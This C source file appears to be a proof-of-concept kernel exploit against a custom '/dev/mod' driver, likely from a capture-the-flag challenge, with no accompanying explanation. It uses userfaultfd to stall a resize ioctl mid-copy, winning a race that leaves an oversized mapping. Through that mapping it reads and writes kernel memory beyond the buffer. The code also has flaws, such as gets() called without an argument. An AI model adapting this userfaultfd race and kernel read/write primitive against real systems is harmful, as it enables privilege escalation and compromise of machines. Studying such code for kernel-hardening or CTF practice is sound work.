
#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/uio.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <linux/kcmp.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sched.h>
#include <errno.h>
#include <poll.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE);   \
} while (0)

#define IOCTL_LOCK_BOX 0x1337
#define IOCTL_UNLOCK_BOX 0x1338
#define IOCTL_SET_BOX 0x1339
#define IOCTL_RESIZE_BOX 0x133a

int g_fd;

void hexDump(unsigned char *buf, int len)
{
    int i;

    for(i = 0 ;i <len ;i+=4)
    {
        if(i%16 == 0)
    	{
        	printf("\n");
			printf("%04x ",i);
        }
       printf(" %02x%02x%02x%02x",buf[i],buf[i+1],buf[i+2],buf[i+3]);
    }
	printf("\n");
}

int box_lock(int fd, size_t key) {
	return ioctl(fd, IOCTL_LOCK_BOX, &key);
}

int box_unlock(int fd, size_t key) {
	return ioctl(fd, IOCTL_UNLOCK_BOX, &key);
}

int box_set(int fd, size_t key) {
	return ioctl(fd, IOCTL_SET_BOX, &key);
}

struct Resize {
	size_t size;
	size_t key;
};

int box_resize(int fd, size_t key, size_t size) {

	struct Resize resize;
	resize.size = size;
	resize.key = key;
	return ioctl(fd, IOCTL_RESIZE_BOX, &resize);
}

int open_device() {
	int fd;
	fd = open("/dev/mod", O_RDWR); 
	return fd;
}

int test() {
	printf("[+] Test Started");
	int fd = open_device();

    unsigned long size = 0x1000;
	unsigned long mmapStart = 0x52424000;

	unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    printf("[+] addr: %lx\n",addr);
	if (addr == MAP_FAILED)
	{
		perror("Failed to mmap: ");
		close(fd);
		return -1;
	}
	printf("[+] mmap OK addr: %lx\n", addr);
	size_t key = 0xdeadbeef;
	box_set(fd, key);
	hexDump(addr, 0x10);
	addr[0] = 0x414141414;
	hexDump(addr, 0x10);
	box_lock(fd,key);
	hexDump(addr, 0x10);
	box_unlock(fd, key);
	hexDump(addr, 0x10);

	box_resize(fd,key, 0x1000);
	printf("[+] Test Done");
}

int trigger() {
	printf("[+] Triggering\n");


    unsigned long size = 0x2000;
	unsigned long mmapStart = 0x52424000;

	void * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, g_fd, 0x0);
    printf("addr: %lx\n",addr);
	if (addr == MAP_FAILED)
	{
		perror("Failed to mmap: ");
		return -1;
	}

	printf("[+] Reading from Kernel\n");
	hexDump(addr+0x1000, 0x20);
	printf("[+] Writing to Kernel\n");
	((size_t *)(addr+0x1000))[0] = 0xdeadbeef;
	hexDump(addr+0x1000, 0x20);
	gets();
	return 1;
}

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            errExit("mmap");
    }

    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        errExit("poll");

    printf("\nfault_handler_thread():\n");
    printf("    poll() returns: nready = %d; "
            "POLLIN = %d; POLLERR = %d\n", nready,
            (pollfd.revents & POLLIN) != 0,
            (pollfd.revents & POLLERR) != 0);

    /* Read an event from the userfaultfd */

    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
        printf("EOF on userfaultfd!\n");
        exit(EXIT_FAILURE);
    }

    if (nread == -1)
        errExit("read");

    /* We expect only one kind of event; verify that assumption */

    if (msg.event != UFFD_EVENT_PAGEFAULT) {
        fprintf(stderr, "Unexpected event on userfaultfd\n");
        exit(EXIT_FAILURE);
    }

    /* Display info about the page-fault event */

    printf("    UFFD_EVENT_PAGEFAULT event: ");
    printf("flags = %llx; ", msg.arg.pagefault.flags);
    printf("address = %llx\n", msg.arg.pagefault.address);


	trigger();
    
    /* Copy the page pointed to by 'page' into the faulting
        region. Vary the contents that are copied in, so that it
        is more obvious that each fault is handled separately. */


	size_t key = 0xdeadbeef;
    memcpy(page,&key,sizeof(size_t));

    uffdio_copy.src = (unsigned long) page;

    /* We need to handle page faults in units of pages(!).
        So, round faulting address down to page boundary */

    uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                        ~(0x1000 - 1);
    uffdio_copy.len = 0x1000;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        errExit("ioctl(UFFDIO_COPY)");

    printf("\tuffdio_copy.copy returned %lld\n",
            uffdio_copy.copy);


    return NULL;
}

void * init_userfaltfd(void * addr){
    long uffd;          /* userfaultfd file descriptor */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    printf("[+] userfaltfd : %ld\n",uffd);

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = 0x1000;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    
    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }

    return addr;
}



int poc() {
	g_fd = open_device();
	box_set(g_fd, 0xdeadbeef);

	void * addr = 0xdead0000;
    unsigned int * addr1 = mmap(addr, 0x1000, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (addr1 == MAP_FAILED)
	{
		perror("Failed to mmap: ");
		return -1;
	}
	unsigned int * addr2 = mmap(addr + 0x1000, 0x1000, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (addr2 == MAP_FAILED)
	{
		perror("Failed to mmap: ");
		return -1;
	}

	init_userfaltfd(addr2);

	struct Resize * resize = (struct Resize *)(addr + (0x1000 - sizeof(size_t)));
	// struct Resize * resize = (struct Resize *)(addr2);
	printf("[+] Resize located at : %p", resize);
	resize->size = 0x2000;

	ioctl(g_fd, IOCTL_RESIZE_BOX, resize);
	return 0;
}

int main() {
	test();
	poc();

	exit(0);
}
